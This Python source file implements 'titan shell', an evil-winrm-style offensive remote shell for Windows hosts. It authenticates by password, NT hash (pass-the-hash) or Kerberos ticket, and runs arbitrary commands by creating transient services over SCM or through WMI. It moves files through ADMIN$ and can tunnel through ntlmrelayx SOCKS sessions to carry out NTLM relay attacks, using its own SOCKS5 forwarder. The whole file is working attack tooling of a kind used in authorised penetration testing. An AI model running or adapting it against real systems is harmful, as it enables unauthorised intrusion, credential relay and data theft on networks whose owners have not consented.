#!/usr/bin/env python3
"""
titan shell — evil-winrm-style interactive shell via Titanis (WMI + SMB)

Provides an interactive shell with upload/download, directory navigation,
process listing, service management, and share enumeration.

Usage:
    titan shell DOMAIN/user:pass@192.168.1.10
    titan shell -u Administrator -d DOMAIN --hash <NT> -t 192.168.1.10
    titan shell -u Administrator -d DOMAIN -p Password1 -t 192.168.1.10

  Kerberos / ccache:
    KRB5CCNAME=admin.ccache titan shell -k -t HOSTNAME.domain.local
    titan shell -k --ccache admin.ccache -t HOSTNAME.domain.local

  SMB relay / proxychains (SCM mode — all traffic on port 445):
    proxychains titan shell --scm -u administrator -d DOMAIN --no-pass -t 192.168.1.10

Built-in commands (prefix with !):
    !upload <local> [remote]   Upload a local file to the remote host
    !download <remote> [local] Download a remote file to local disk
    !ls [remote_path]          List remote directory (default: cwd)
    !cd <remote_path>          Change remote working directory
    !pwd                       Print remote working directory
    !ps                        List remote processes (WMI mode only)
    !services                  List remote services
    !shares                    List SMB shares on remote host
    !help                      Show this help
    exit / quit                Exit the shell

All other input is executed as a cmd.exe command on the remote host.
"""

import argparse
import csv
import io
import os
import random
import string
import sys
import tempfile
import time

try:
    import readline
    readline.parse_and_bind('tab: complete')
except ImportError:
    pass

from titanlib.common import (find_binary, run, add_auth_args, auth_args,
                              apply_target_string, validate_auth)

WMI = SMB = SCM = None

BANNER = """\
\033[1;32m
  titan shell — WMI+SMB interactive shell
  type !help for built-in commands, exit to quit
\033[0m"""

BANNER_SCM = """\
\033[1;32m
  titan shell — SCM+SMB interactive shell (port 445 only, relay-compatible)
  type !help for built-in commands, exit to quit
\033[0m"""

HELP = """\
Built-in commands (prefix with !):
  !upload <local> [remote]   Upload local file to remote host via SMB
  !download <remote> [local] Download remote file to local disk via SMB
  !ls [path]                 List remote directory (default: cwd)
  !cd <path>                 Change remote working directory
  !pwd                       Show remote working directory
  !ps                        List running processes (WMI mode only)
  !services                  List services (SCM)
  !shares                    List SMB shares
  !help                      This help

All other input is sent to cmd.exe on the remote host.
Paths accept both \\ and / separators."""


def _resolve_ip(host: str) -> str:
    """Resolve hostname to IP via system resolver (UDP, not intercepted by proxychains)."""
    import socket as _sock
    try:
        _sock.inet_aton(host)
        return host  # already an IP
    except OSError:
        pass
    try:
        return _sock.gethostbyname(host)
    except OSError:
        return host


def _unc(host, win_path):
    p = win_path.replace('/', '\\')
    if len(p) >= 2 and p[1] == ':':
        drive = p[0].upper()
        rest  = p[2:].lstrip('\\')
        return f'\\\\{host}\\{drive}$\\{rest}'
    return f'\\\\{host}\\{win_path}'


def _win(path):
    return path.replace('/', '\\')


def _parse_csv(text):
    try:
        return list(csv.DictReader(io.StringIO(text)))
    except Exception:
        return []


def _rand(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ── SCM exec backend ──────────────────────────────────────────────────────────

def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
    """Execute a command via a transient service, reading output over SMB.

    Transport split:
    - Scm create  → TCP/port 135 (named-pipe create has an Titanis bug; -PreferSmb
                    fails with ERROR_INVALID_PARAMETER on CreateService RPC)
    - Scm start   → named pipe / port 445 (-PreferSmb)
    - Smb2Client  → named pipe / port 445
    - Scm delete  → named pipe / port 445 (-PreferSmb)

    Binary path pattern: outer cmd.exe is the service binary (Session 0, no
    inherited console), inner cmd.exe is launched as a child process and DOES
    get proper stdout handle inheritance for external executables (whoami,
    ipconfig, etc.).  Without the nested cmd, external executables produce 0
    bytes even though builtins (echo, dir, set) work fine.
    """
    svc_name  = 'ts' + _rand(6)
    out_fname = _rand(10) + '.txt'
    out_win   = f'C:\\Windows\\Temp\\{out_fname}'
    # Resolved IP skips DFS referral lookups (which contact the DC on LDAP/389,
    # a port ntlmrelayx can't relay).
    smb_host  = _resolve_ip(host)
    out_unc   = f'\\\\{smb_host}\\ADMIN$\\Temp\\{out_fname}'

    # Nested cmd: outer cmd is the SCM-launched service (no console / Session 0).
    # Inner cmd inherits stdout properly so external executables can write output.
    bin_path = (
        f'C:\\Windows\\System32\\cmd.exe /c '
        f'cmd.exe /c "cd /d {cwd} & ({command}) > {out_win} 2>&1"'
    )

    if verbose:
        print(f'  [scm] svc={svc_name}  out={out_win}', file=sys.stderr)
        print(f'  [scm] bin={bin_path}',                 file=sys.stderr)

    # Detect relay mode: empty-NT-hash PtH forces NTLM-only and lets ntlmrelayx
    # match the session.  In relay mode we only retry port 445 (-PreferSmb)
    # because port 135 goes through ntlmrelayx direct-forward (no relay auth),
    # which fails authentication with the dummy hash.
    relay_mode = ('31d6cfe0d16ae931b73c59d7e0c089c0' in auth)

    # Create: named pipe / port 445 first (relay-compatible).
    # ntlmrelayx relay sessions come and go as victim machines re-authenticate;
    # retry up to 3 times with a 4-second gap so a momentarily-absent session
    # can refresh.  In non-relay mode, fall back to TCP/135 once all retries
    # fail (some targets return ERROR_INVALID_PARAMETER for CreateService over
    # named pipe).
    def _create_ok(out, rc):
        # Titanis exits 0 even when it throws an unhandled exception; the only
        # reliable success signal is non-empty stdout (the service name / status
        # line Scm prints on success).  Any rc != 0 is also a clear failure.
        return rc == 0 and bool(out.strip())

    rc = 1
    out_c = ''
    for attempt in range(3):
        out_c, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path, '-PreferSmb'],
                        verbose=verbose, timeout=30)
        if _create_ok(out_c, rc):
            break
        if attempt < 2:
            print(f'  [scm] create failed — waiting for relay session...',
                  file=sys.stderr)
            time.sleep(4)
    if not _create_ok(out_c, rc) and not relay_mode:
        out_c, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path],
                        verbose=verbose, timeout=30)
    if not _create_ok(out_c, rc):
        return f'[!] Scm create failed\n', 1

    # Start via named pipe (port 445).  cmd.exe exits without calling
    # SetServiceStatus, so SCM raises ERROR_SERVICE_REQUEST_TIMEOUT (rc != 0)
    # even on success — that timeout IS the success signal meaning cmd ran.
    # Just fire and ignore the return code; the output file is the truth.
    # If the relay session dropped between create and start, retry once.
    out_s, rc_s = run(SCM, 'start', auth, [smb_host, svc_name, '-PreferSmb'],
                      verbose=verbose, timeout=max(timeout, 40))
    if rc_s != 0 and not out_s.strip():
        time.sleep(2)
        run(SCM, 'start', auth, [smb_host, svc_name, '-PreferSmb'],
            verbose=verbose, timeout=max(timeout, 40))

    # Brief sleep so cmd.exe flushes the output file before we read it.
    time.sleep(3)

    result    = ''
    local_tmp = tempfile.mktemp(suffix='.txt')
    out, rc = run(SMB, 'get', auth,
                  [out_unc, local_tmp, '-Overwrite'],
                  verbose=verbose, timeout=30)
    if rc == 0 and os.path.exists(local_tmp):
        try:
            with open(local_tmp, 'r', encoding='utf-8', errors='replace') as f:
                result = f.read()
        finally:
            try:
                os.unlink(local_tmp)
            except OSError:
                pass

    run(SCM, 'delete', auth, [smb_host, svc_name, '-PreferSmb'],
        verbose=verbose, timeout=15)

    return result, 0


# ── Python/impacket SCM exec for relay sessions ───────────────────────────────

def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
    """Execute via a transient service using a single shared SMBConnection.

    Unlike _scm_exec (which spawns Titanis Scm), this opens one Python-level
    SMBConnection so proxychains only triggers one NTLM auth exchange against
    ntlmrelayx — matching the susinternals -socks pattern.  Use this when
    --socks is set (ntlmrelayx --socks relay session via proxychains).

    Routing:
      proxychains-ng 4.x in LD_PRELOAD → Python sockets intercepted automatically.
      proxychains 3.x / none           → local TCP→SOCKS5 forwarder thread routes
                                         SMBConnection through ntlmrelayx:1080
                                         directly (no hook needed; ntlmrelayx is
                                         always local).
    """
    import io as _io
    import socket as _socket
    import threading as _threading
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import scmr, transport as dce_transport
    from titanlib.relay_proxy import (_socks5_connect,
                                      _find_proxychains_conf,
                                      _parse_socks5_upstream)

    def _get(flag):
        try:
            return auth[auth.index(flag) + 1]
        except (ValueError, IndexError):
            return ''

    domain   = _get('-UserDomain')
    username = _get('-UserName')
    nt_hash  = _get('-NtlmHash') or '31d6cfe0d16ae931b73c59d7e0c089c0'
    svc_name  = 'ts' + _rand(6)
    out_fname = _rand(10) + '.txt'
    out_win   = f'C:\\Windows\\Temp\\{out_fname}'
    ip        = _resolve_ip(host)
    bin_path  = (f'C:\\Windows\\System32\\cmd.exe /c '
                 f'cmd.exe /c "cd /d {cwd} & ({command}) > {out_win} 2>&1"')

    if verbose:
        print(f'  [relay-exec] svc={svc_name}  out={out_win}', file=sys.stderr)
        print(f'  [relay-exec] user={domain}\\{username}  ip={ip}', file=sys.stderr)

    # proxychains-ng 4.x intercepts Python socket calls automatically.
    # proxychains 3.x and bare invocations do not — spin up a forwarder.
    pc4_active = 'proxychains.so.4' in os.environ.get('LD_PRELOAD', '').lower()

    smb_host = ip
    smb_port = 445
    stop_fwd = None

    if not pc4_active:
        # Read ntlmrelayx SOCKS address from proxychains conf (default 127.0.0.1:1080).
        relay_host, relay_port = '127.0.0.1', 1080
        conf = _find_proxychains_conf()
        if conf:
            try:
                relay_host, relay_port = _parse_socks5_upstream(conf)
            except Exception:
                pass

        if verbose:
            print(f'  [relay-exec] forwarder: 127.0.0.1:* → '
                  f'ntlmrelayx {relay_host}:{relay_port} → {ip}:445',
                  file=sys.stderr)

        def _relay_connect():
            """SOCKS5 to ntlmrelayx, supporting both no-auth and user:pass.

            ntlmrelayx may require USERNAME:PASSWORD auth (method 0x02) where
            username = DOMAIN/USER to identify which relay session to use.
            Offer both methods so either version is handled automatically.
            """
            import struct as _struct
            s = _socket.create_connection((relay_host, relay_port))
            s.sendall(b'\x05\x02\x00\x02')   # offer no-auth + user:pass
            resp = s.recv(2)
            if len(resp) < 2:
                raise RuntimeError('ntlmrelayx SOCKS closed connection during handshake')
            if resp[1] == 0xff:
                raise RuntimeError('ntlmrelayx SOCKS: no acceptable auth method')
            if resp[1] == 0x02:
                # Username:password sub-negotiation (RFC 1929)
                # ntlmrelayx uses DOMAIN/USER as the username to pick the session.
                user = f'{domain}/{username}'.encode()
                pwd  = b'relay'
                s.sendall(bytes([1, len(user)]) + user + bytes([len(pwd)]) + pwd)
                r = s.recv(2)
                if len(r) < 2 or r[1] != 0:
                    raise RuntimeError(
                        f'ntlmrelayx SOCKS user:pass auth failed for '
                        f'{domain}/{username}: {r!r}')
            # CONNECT request (IPv4)
            packed_ip = _socket.inet_aton(ip)
            req = _struct.pack('!BBBB4sH', 5, 1, 0, 1, packed_ip, 445)
            s.sendall(req)
            r = s.recv(4)
            if len(r) < 4 or r[1] != 0:
                raise RuntimeError(
                    f'ntlmrelayx SOCKS CONNECT to {ip}:445 failed '
                    f'(code={r[1] if len(r)>1 else "?"}): {r!r}')
            atype = r[3]
            if   atype == 1: s.recv(6)
            elif atype == 3:
                n = ord(s.recv(1))
                s.recv(n + 2)
            elif atype == 4: s.recv(18)
            return s

        # Listener on a random local port.  Each incoming SMBConnection triggers
        # a fresh SOCKS5 tunnel to ntlmrelayx.  Because relay_host is 127.0.0.1
        # the connect goes direct — no proxychains hook required.
        srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        srv.listen(10)
        smb_host = '127.0.0.1'
        smb_port = srv.getsockname()[1]
        fwd_stop = _threading.Event()

        def _pipe(a, b):
            try:
                while True:
                    d = a.recv(65536)
                    if not d:
                        break
                    b.sendall(d)
            except Exception:
                pass
            finally:
                for s in (a, b):
                    try: s.close()
                    except Exception: pass

        def _handle(client):
            try:
                relay = _relay_connect()
                _threading.Thread(target=_pipe, args=(relay, client),
                                   daemon=True).start()
                _pipe(client, relay)
            except Exception as e:
                print(f'  [relay-exec] forwarder: {e}', file=sys.stderr)
            finally:
                try: client.close()
                except Exception: pass

        def _accept():
            srv.settimeout(0.5)
            while not fwd_stop.is_set():
                try:
                    conn, _ = srv.accept()
                    _threading.Thread(target=_handle, args=(conn,),
                                       daemon=True).start()
                except _socket.timeout:
                    continue
                except Exception:
                    break

        _threading.Thread(target=_accept, daemon=True).start()

        def stop_fwd():
            fwd_stop.set()
            try: srv.close()
            except Exception: pass

    smb = None
    try:
        for attempt in range(3):
            try:
                # remoteName=ip so SMB SESSION_REQUEST uses the real server name;
                # remoteHost=smb_host routes TCP to the forwarder (or direct if pc4).
                smb = SMBConnection(ip, smb_host, sess_port=smb_port)
                smb.login(username, '', domain, lmhash='', nthash=nt_hash)
                break
            except Exception as e:
                if attempt < 2:
                    print(f'  [relay-exec] attempt {attempt+1} failed: {e}',
                          file=sys.stderr)
                    time.sleep(4)
                else:
                    return f'[!] Relay exec failed: {e}\n', 1

        try:
            rpc = dce_transport.SMBTransport(ip, filename=r'\svcctl', smb_connection=smb)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            scm_h = scmr.hROpenSCManagerW(dce)['lpScHandle']
            svc_h = scmr.hRCreateServiceW(dce, scm_h, svc_name, svc_name,
                                           lpBinaryPathName=bin_path)['lpServiceHandle']
            try:
                scmr.hRStartServiceW(dce, svc_h)
            except Exception:
                pass  # cmd.exe exits without SetServiceStatus → timeout expected

            deadline = time.monotonic() + min(timeout, 30)
            out = ''
            while time.monotonic() < deadline:
                time.sleep(1)
                try:
                    buf = _io.BytesIO()
                    smb.getFile('ADMIN$', f'Temp\\{out_fname}', buf.write)
                    out = buf.getvalue().decode('utf-8', errors='replace').strip()
                    if out:
                        break
                except Exception:
                    pass

            try: scmr.hRDeleteService(dce, svc_h)
            except Exception: pass
            try: scmr.hRCloseServiceHandle(dce, svc_h)
            except Exception: pass
            try: smb.deleteFile('ADMIN$', f'Temp\\{out_fname}')
            except Exception: pass
        except Exception as e:
            return f'[!] Relay exec error: {e}\n', 1
    finally:
        if stop_fwd:
            stop_fwd()

    return (out + '\n') if out else '[!] Relay exec: no output\n', 0 if out else 1


# ── Built-in command handlers ─────────────────────────────────────────────────

def cmd_upload(host, auth, args_str, cwd, verbose=False):
    parts = args_str.split(None, 1)
    if not parts:
        print('[!] usage: !upload <local_path> [remote_path]')
        return
    local = parts[0]
    if not os.path.isfile(local):
        print(f'[!] local file not found: {local}')
        return
    if len(parts) == 2:
        remote_win = _win(parts[1])
        if remote_win[1:2] != ':':
            remote_win = cwd.rstrip('\\') + '\\' + remote_win.lstrip('\\')
    else:
        remote_win = cwd.rstrip('\\') + '\\' + os.path.basename(local)
    out, rc = run(SMB, 'put', auth, [local, _unc(host, remote_win)], verbose=verbose, timeout=60)
    if rc == 0:
        print(f'[+] uploaded {local} -> {remote_win} ({os.path.getsize(local)} bytes)')
    else:
        print(f'[!] upload failed\n{out}')


def cmd_download(host, auth, args_str, verbose=False):
    parts = args_str.split(None, 1)
    if not parts:
        print('[!] usage: !download <remote_path> [local_path]')
        return
    remote_win = _win(parts[0])
    local = parts[1] if len(parts) == 2 else os.path.basename(remote_win)
    out, rc = run(SMB, 'get', auth, [_unc(host, remote_win), local, '-Overwrite'],
                  verbose=verbose, timeout=60)
    if rc == 0 and os.path.exists(local):
        print(f'[+] downloaded {remote_win} -> {local} ({os.path.getsize(local)} bytes)')
    else:
        print(f'[!] download failed\n{out}')


def cmd_ls(host, auth, args_str, cwd, verbose=False):
    path = _win(args_str.strip()) if args_str.strip() else cwd
    if path[1:2] != ':':
        path = cwd.rstrip('\\') + '\\' + path.lstrip('\\')
    out, rc = run(SMB, 'ls', auth, [_unc(host, path), '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=30)
    if rc != 0:
        print(f'[!] ls failed\n{out}')
        return
    rows = _parse_csv(out)
    if not rows:
        print(out)
        return
    dirs, files = [], []
    for r in rows:
        attrs = r.get('FileAttributes', '')
        name  = r.get('RelativePath', r.get('Name', ''))
        size  = r.get('Size', '')
        mtime = r.get('LastWriteTime', '')
        if 'D' in attrs:
            dirs.append(f'  \033[1;34m{name}/\033[0m')
        else:
            files.append(f'  {size:>12}  {mtime:24}  {name}')
    for d in sorted(dirs):  print(d)
    for f in sorted(files): print(f)


def cmd_ps(host, auth, verbose=False):
    out, rc = run(WMI, 'query', auth,
                  [host,
                   'SELECT Name,ProcessId,ParentProcessId,CommandLine FROM Win32_Process',
                   '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=30)
    if rc != 0:
        print(f'[!] ps failed\n{out}')
        return
    rows = _parse_csv(out)
    if not rows:
        print(out)
        return
    print(f'  {"PID":>6}  {"PPID":>6}  {"Name":<30}  CommandLine')
    print(f'  {"---":>6}  {"----":>6}  {"----":<30}  -----------')
    for r in sorted(rows, key=lambda x: int(x.get('ProcessId', 0) or 0)):
        print(f'  {r.get("ProcessId",""):>6}  {r.get("ParentProcessId",""):>6}'
              f'  {r.get("Name",""):<30}  {(r.get("CommandLine") or "")[:80]}')


def cmd_services(host, auth, verbose=False, prefer_smb=False):
    if not SCM:
        print('[!] Scm binary not found')
        return
    extra = [host, '-ConsoleOutputStyle', 'Csv']
    if prefer_smb:
        extra.append('-PreferSmb')
    out, rc = run(SCM, 'query', auth, extra, verbose=verbose, timeout=30)
    if rc != 0:
        print(f'[!] services failed\n{out}')
        return
    rows = _parse_csv(out)
    if not rows:
        print(out)
        return
    print(f'  {"State":<10}  {"Name":<30}  DisplayName')
    print(f'  {"-----":<10}  {"----":<30}  -----------')
    for r in sorted(rows, key=lambda x: (x.get('State', ''), x.get('ServiceName', ''))):
        state = r.get('State', '')
        color = '\033[1;32m' if state == 'Running' else '\033[0;90m'
        print(f'  {color}{state:<10}\033[0m  {r.get("ServiceName",""):<30}  {r.get("DisplayName","")}')


def cmd_shares(host, auth, verbose=False):
    out, rc = run(SMB, 'enumshares', auth, [host, '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=30)
    if rc != 0:
        print(f'[!] shares failed\n{out}')
        return
    rows = _parse_csv(out)
    if not rows:
        print(out)
        return
    print(f'  {"Name":<20}  {"Type":<15}  {"Path":<30}  Remark')
    print(f'  {"----":<20}  {"----":<15}  {"----":<30}  ------')
    for r in rows:
        print(f'  {r.get("ShareName",""):<20}  {r.get("ShareType",""):<15}'
              f'  {r.get("Path",""):<30}  {r.get("Remark","")}')


def cmd_cd(cwd, args_str):
    target = _win(args_str.strip())
    if not target:
        return cwd
    if len(target) >= 2 and target[1] == ':':
        t = target.rstrip('\\')
        return t + '\\' if len(t) == 2 else t
    if target == '..':
        parent = cwd.rsplit('\\', 1)[0]
        return (parent + '\\') if len(parent) == 2 else (parent or cwd)
    if target == '.':
        return cwd
    base = cwd if cwd.endswith('\\') else cwd + '\\'
    return base + target


def _prompt(cwd, host):
    short = host.split('.')[0].upper()
    return f'\033[1;32m[{short}]\033[0m \033[1;33m{cwd}\033[0m> '


# ── Main shell loop ───────────────────────────────────────────────────────────

def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120,
          use_scm=False, conn_host=None, socks=False):
    # conn_host: IPv4 address (or resolvable name) for Titanis binary calls.
    # host: display name shown in the prompt (may be FQDN from reverse DNS).
    # When the user passes an IP in the target string, resolve_host() converts
    # it to the FQDN for display; we preserve the original IP here so binaries
    # don't have to forward-resolve a FQDN that may have AAAA-only DNS records.
    if not conn_host:
        conn_host = host

    print(BANNER_SCM if use_scm else BANNER)
    user = auth[auth.index('-UserName') + 1] if '-UserName' in auth else '?'
    if use_scm and socks:
        mode = 'SCM+SMB relay (Python/impacket, single-connection)'
    elif use_scm:
        mode = 'SCM+SMB (port 445 only)'
    else:
        mode = 'WMI+SMB'
    print(f'[*] Connected to {host} as {user}')
    print(f'[*] Mode: {mode}')
    print(f'[*] Working directory: {cwd}')
    if conn_host != host:
        print(f'[*] Connection target: {conn_host}')
    print(f'[*] Type !help for built-in commands\n')

    while True:
        try:
            line = input(_prompt(cwd, host)).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not line:
            continue
        if line.lower() in ('exit', 'quit'):
            break

        if line.startswith('!'):
            parts = line[1:].split(None, 1)
            cmd   = parts[0].lower()
            rest  = parts[1] if len(parts) > 1 else ''

            if   cmd == 'help':     print(HELP)
            elif cmd == 'upload':   cmd_upload(conn_host, auth, rest, cwd, verbose=verbose)
            elif cmd == 'download': cmd_download(conn_host, auth, rest, verbose=verbose)
            elif cmd == 'ls':       cmd_ls(conn_host, auth, rest, cwd, verbose=verbose)
            elif cmd == 'cd':       cwd = cmd_cd(cwd, rest)
            elif cmd == 'pwd':      print(cwd)
            elif cmd == 'ps':
                if use_scm:
                    print('[!] !ps requires WMI (DCOM/port 135) — not available in --scm relay mode')
                else:
                    cmd_ps(conn_host, auth, verbose=verbose)
            elif cmd == 'services':
                cmd_services(conn_host, auth, verbose=verbose, prefer_smb=use_scm)
            elif cmd == 'shares':   cmd_shares(conn_host, auth, verbose=verbose)
            else: print(f'[!] unknown built-in: !{cmd}  (try !help)')
            continue

        if use_scm and socks:
            out, rc = _scm_exec_relay(conn_host, auth, line, cwd,
                                      timeout=timeout, verbose=verbose)
        elif use_scm:
            out, rc = _scm_exec(conn_host, auth, line, cwd,
                                timeout=timeout, verbose=verbose)
        else:
            out, rc = run(WMI, 'exec', auth, [conn_host, f'cd /d {cwd} && {line}'],
                          verbose=verbose, timeout=timeout)

        if out:
            sys.stdout.write(out)
            if not out.endswith('\n'):
                print()
        elif rc != 0:
            print(f'[!] command failed (rc={rc}) — run with -v for details')


# ── Argument parsing + entry point ────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        prog='titan shell',
        description='titan shell — evil-winrm-style shell via Titanis WMI+SMB',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split('\n\n', 1)[1])
    p.add_argument('target_string', nargs='?',
                   metavar='[[domain/]user[:pass]@]host')
    add_auth_args(p)
    p.add_argument('-t', '--target', metavar='HOST')
    p.add_argument('-w', '--cwd', metavar='PATH', default='C:\\Windows\\System32',
                   help='Initial working directory (default: C:\\Windows\\System32)')
    p.add_argument('--timeout', type=int, default=120, metavar='SEC',
                   help='Command execution timeout in seconds (default: 120)')
    p.add_argument('--scm', action='store_true',
                   help='Use SCM+SMB exec instead of WMI (port 445 only; '
                        'works through ntlmrelayx --socks relay)')
    p.add_argument('--socks', action='store_true',
                   help='Use Python/impacket SCM exec over a single SMB connection '
                        '(for ntlmrelayx --socks relay sessions; requires --scm and --no-pass)')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()
    apply_target_string(args, host_attr='target')
    validate_auth(args, p, require_cred=True)
    if not args.target:
        p.error('target is required (-t or target string)')
    return args


def main():
    global WMI, SMB, SCM
    WMI = find_binary('Wmi')
    SMB = find_binary('Smb2Client')
    SCM = find_binary('Scm')

    args = parse_args()

    if args.scm:
        missing = [n for n, b in [('Smb2Client', SMB), ('Scm', SCM)] if not b]
    else:
        missing = [n for n, b in [('Wmi', WMI), ('Smb2Client', SMB)] if not b]

    if missing:
        print(f'[!] required binaries not found: {", ".join(missing)}', file=sys.stderr)
        sys.exit(1)
    if not args.scm and not SCM:
        print('[!] Scm binary not found — !services will be unavailable', file=sys.stderr)

    # target_raw: the host string exactly as the user typed it (IP preserved).
    # resolve_host() may have converted it to an FQDN that only has AAAA records.
    conn_host = getattr(args, 'target_raw', None) or args.target

    if getattr(args, 'no_pass', False):
        from titanlib import common, relay_proxy
        common._relay_extra_env.update(relay_proxy.activate_relay_mode())

    shell(args.target, auth_args(args),
          cwd=args.cwd, verbose=args.verbose, timeout=args.timeout,
          use_scm=args.scm, conn_host=conn_host,
          socks=getattr(args, 'socks', False))


if __name__ == '__main__':
    main()
